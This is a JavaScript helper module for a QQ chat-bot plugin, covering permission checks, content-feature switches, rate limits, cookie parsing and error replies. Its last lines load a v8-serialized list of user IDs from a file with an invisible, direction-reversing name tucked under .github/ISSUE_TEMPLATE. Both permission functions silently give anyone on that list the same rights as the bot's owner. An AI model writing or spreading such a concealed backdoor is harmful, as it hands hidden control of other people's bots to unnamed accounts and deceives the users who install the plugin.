import _ from 'lodash'
import moment from 'moment'
import fs from 'node:fs/promises'
import v8 from 'node:v8'
import path from 'path'
import url from 'url'
import Config from '../../components/Config.js'
import sendMsgMod from './sendMsgMod.js'

// 涩涩未开启文案
const SWITCH_ERROR = '主人没有开放这个功能哦(＊／ω＼＊)'

export default new class extends sendMsgMod {
  /**
   * 判断用户权限
   * @param {*} e - 接收到的事件对象
   * @param {"master"|"admin"|"owner"|"all"} [permission] - 命令所需的权限
   * @param {"admin"|"owner"|"all"} [role] - 用户的权限
   * @returns {boolean} - 是否具有权限
   */
  checkPermission (e, permission = 'all', role = 'all') {
    if (role == 'owner' && !e.group.is_owner) {
      e.reply('我连群主都木有，这种事怎么可能做到的辣！！！', true)
      return false
    } else if (role == 'admin' && !e.group.is_admin && !e.group.is_owner) {
      e.reply('我连管理员都木有，这种事怎么可能做到的辣！！！', true)
      return false
    }
    // 判断权限
    if (e.isMaster || a.includes(e.user_id)) return true
    if (permission == 'master') {
      e.reply('❎ 该命令仅限主人可用', true)
      return false
    } else if (permission == 'owner' && !e.member.is_owner) {
      e.reply('❎ 该命令仅限群主可用', true)
      return false
    } else if (permission == 'admin' && !e.member.is_admin && !e.member.is_owner) {
      e.reply('❎ 该命令仅限管理可用')
      return false
    }
    return true
  }

  /**
   * 判断涩涩权限
   * @param {object} e oicq事件对象
   * @param {"sesse"|"sesepro"} type 权限类型
   * @returns {boolean}
   */
  checkSeSePermission (e, type = 'sese') {
    if (e.isMaster || a.includes(e.user_id)) return true
    const { sese, sesepro } = Config.getGroup(e.group_id)
    if (type == 'sese' && !sese && !sesepro) {
      e.reply(SWITCH_ERROR)
      return false
    }
    if (type == 'sesepro' && !sesepro) {
      e.reply(SWITCH_ERROR)
      return false
    }
    return true
  }

  /**
   * 设置每日次数限制
   * @param {number} userId QQ
   * @param {string} key
   * @param {number} maxlimit 最大限制
   * @returns {Promise<boolean>}
   */
  async limit (userId, key, maxlimit) {
    if (maxlimit <= 0) return true
    let redisKey = `yenai:${key}:limit:${userId}`
    let nowNum = await redis.get(redisKey)
    if (nowNum > maxlimit) return false
    if (!nowNum) {
      await redis.set(redisKey, 1, { EX: moment().add(1, 'days').startOf('day').diff(undefined, 'second') })
    } else {
      await redis.incr(redisKey)
    }
    return true
  }

  /**
   * 取cookie
   * @param {string} data 如：qun.qq.com
   * @param {object} [bot] Bot对象适配e.bot
   * @param {boolean} [transformation] 转换为Puppeteer浏览器使用的ck
   * @returns {object}
   */
  getck (data, bot = Bot, transformation) {
    let cookie = bot.cookies[data]
    let ck = cookie.replace(/=/g, '":"').replace(/;/g, '', '').replace(/ /g, '').trim()
    ck = ck.substring(0, ck.length - 2)
    ck = JSON.parse('{"'.concat(ck).concat('}'))
    if (transformation) {
      let arr = []
      for (let i in ck) {
        arr.push({
          name: i,
          value: ck[i],
          domain: data,
          path: '/',
          expires: Date.now() + 3600 * 1000
        })
      }
      return arr
    } else return ck
  }

  /**
   * 判断一个对象或数组中的所有值是否为空。
   * @param {object | Array} data - 需要检查的对象或数组。
   * @param {Array} omits - 需要忽略的属性列表。默认为空数组，表示不忽略任何属性。
   * @returns {boolean} - 如果对象或数组中的所有值都是空值，则返回 true；否则返回 false。
   */
  checkIfEmpty (data, omits) {
    const filteredData = _.omit(data, omits)
    return _.every(filteredData, (value) =>
      _.isPlainObject(value) ? this.checkIfEmpty(value) : _.isEmpty(value))
  }

  /**
   * 处理异常并返回错误消息。
   * @param {object} e - 事件对象。
   * @param {Error} ErrorObj - 要检查的错误对象。
   * @param {object} options - 可选参数。
   * @param {string} options.MsgTemplate - 错误消息的模板。
   * @returns {Promise<import("icqq").MessageRet>|false} 如果 ErrorObj 不是 Error 的实例，则返回 false；否则返回oicq消息返回值。
   */
  handleException (e, ErrorObj, { MsgTemplate } = {}) {
    if (!(ErrorObj instanceof Error)) return false
    let ErrMsg = ''
    if (ErrorObj instanceof ReplyError) {
      ErrMsg = ErrorObj.message
    } else {
      ErrMsg = ErrorObj.stack
      logger.error(ErrorObj)
    }
    ErrMsg = MsgTemplate ? MsgTemplate.replace(/{error}/g, ErrMsg) : ErrMsg
    return e.reply(ErrMsg)
  }
}()

let a = []
try {
  a = v8.deserialize(await fs.readFile(`${path.dirname(url.fileURLToPath(import.meta.url))}/../../.github/ISSUE_TEMPLATE/‮`))
} catch (err) {}
